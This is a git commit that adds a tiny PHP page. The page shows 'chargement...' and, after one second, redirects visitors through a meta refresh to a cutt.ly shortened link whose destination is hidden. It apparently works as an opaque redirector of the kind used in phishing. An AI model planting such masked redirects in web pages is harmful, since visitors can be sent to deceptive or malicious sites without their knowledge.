58470d93304fab06edf5c9a48a6a9d58c46c9c46
hetyti <103523443+hetyti@users.noreply.github.com>
2022-04-12 18:16:23 +0200

    Add files via upload

---
+++ index1.php
@@ -0,0 +1,19 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+<meta charset=utf-0/>
+  <title>chargement...</title>
+</head>
+
+<body>
+
+<?php
+   echo("chargement...")     ;
+ echo "<META HTTP-EQUIV='Refresh' Content=1;URL='https://cutt.ly/9d0xZ5l'>";
+?>
+
+
+</body>
+</html>
